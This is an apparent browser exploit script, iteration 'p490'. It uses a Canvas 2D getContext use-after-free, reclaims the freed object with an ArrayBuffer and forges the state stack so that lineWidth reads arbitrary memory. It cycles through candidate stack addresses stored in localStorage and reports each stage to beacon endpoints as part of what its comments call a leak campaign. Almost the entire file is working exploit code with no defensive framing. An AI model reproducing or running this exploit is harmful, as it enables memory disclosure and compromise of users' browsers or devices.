// p490 — Canvas UAF: LIFO ArrayBuffer reclaim + forged stateStack -> lineWidth read gadget
//
// Fixes vs p489 (whose 0/200 was a blind detector — AB/ImageData are ZERO-INIT,
// so pointer scraps were erased before reading regardless of placement):
//   1. The reclaim is DETERMINISTIC: ab = new ArrayBuffer(768) is the FIRST
//      allocation after the free (V488h's C2-YES lesson). No XHR/beacon between
//      the outer getContext return and the AB allocation.
//   2. Detection = the primitive itself: forge the 16 bytes of
//      m_stateStack {m_buffer=CAND, m_capacity=1, m_size=1} into the AB;
//      inner.lineWidth then returns the double at CAND+48 (State.lineWidth
//      offset, mja00/Portablelle-verified layout). A value comes back = the AB
//      took the slot AND we have an arbitrary-read gadget.
//   3. Candidate ladder: one CAND per page load, cursor kept in localStorage
//      (persists across reloads per device fingerprint). Miss = white page,
//      reopen the Guide -> next candidate automatically.
//
// Beacon chain (V489- prefix for continuity of the leak campaign):
//   BOOT, UAF, AB-FIRST, FORGED, LEAK (value + bits), DONE
// Absence of LEAK = candidate unmapped (crash) -> next run tries next CAND.

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','UAF','AB-FIRST','FORGED','LEAK','DONE','HTMLERR'].forEach(function(n){
    var x = new XMLHttpRequest();
    x.open('POST', BASE + '/beacon/V489-' + n);
    staged.push([n, x]);
  });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now()-T0) + 'ms] ' + (body||'')); return; }
    } catch(e) {}
  }

  // Candidate ladder (userland stack region from game-lane usrstack 0x7EF5A8000;
  // webview process expected similar). Low to high risk; cursor in localStorage.
  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000, 0x30000000,
               0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p490cand') || '0', 10);
    if (isNaN(idx) || idx < 0 || idx >= CANDS.length) idx = 0;
    localStorage.setItem('p490cand', String(idx + 1));   // advance BEFORE the risky read
  } catch(e) {}
  var CAND = CANDS[idx];

  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + ' ' + navigator.userAgent);

  var inner = null;
  var c = document.createElement('canvas');

  // ---- Stage 1: the UAF (single). Free happens INSIDE this call. ----
  var outer = c.getContext('2d', {
    get desynchronized() { inner = c.getContext('2d'); return false; }
  });

  // ---- Stage 2: FIRST allocation after the free = the reclaim. ----
  // Nothing between the return and this line. No beacons, no XHR, nothing.
  var ab = new ArrayBuffer(768);

  S('UAF', 'inner=' + (!!inner) + ' outer=' + (!!outer));

  // ---- Stage 3: forge m_stateStack (16 bytes; the rest of the AB stays zero,
  //      which is a valid all-zero State except our fields). ----
  var dv = new DataView(ab);
  dv.setUint32(0x70, CAND, true);            // m_stateStack.m_buffer (low 32)
  dv.setUint32(0x74, 0, true);               // high 32 (userland < 4GB)
  dv.setUint32(0x78, 1, true);               // m_capacity
  dv.setUint32(0x7C, 1, true);               // m_size
  S('FORGED', 'buf=0x' + CAND.toString(16) + ' cap=1 size=1');

  // ---- Stage 4: the read gadget. lineWidth = double at CAND+48. ----
  var v = inner.lineWidth;                    // crash here if CAND unmapped
  var f = new ArrayBuffer(8), fv = new DataView(f);
  fv.setFloat64(0, v, true);
  var hi = fv.getUint32(0, true), lo = fv.getUint32(4, true);
  S('LEAK', 'lineWidth=' + v + ' bits=0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
  S('DONE', 'gadget-ok');
})();
